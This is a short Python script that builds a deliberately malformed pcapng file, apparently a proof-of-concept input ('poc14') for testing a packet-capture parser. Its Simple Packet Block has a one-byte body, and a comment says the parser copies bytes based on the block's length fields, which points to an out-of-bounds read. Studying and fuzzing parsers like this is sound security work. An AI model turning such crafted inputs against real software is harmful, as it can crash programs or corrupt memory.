import struct, pathlib

def blk(t, body):
    total=12+len(body)
    pad=(4-total%4)%4
    total+=pad
    return struct.pack('<II', t, total)+body+b'\x00'*pad+struct.pack('<I', total)
shb=blk(0x0A0D0D0A, struct.pack('<IHHq', 0x1A2B3C4D, 1, 0, -1))
idb=blk(1, struct.pack('<HHI', 1, 0, 65535))
# Simple packet block with tiny body; parser computes actual_len from total length and copies that many bytes.
body=struct.pack('<I', 0x12345678)+b'\x41'
spb=blk(3, body)
path=pathlib.Path('/workspace/poc14.pcapng')
path.write_bytes(shb+idb+spb)
print(path, path.stat().st_size)
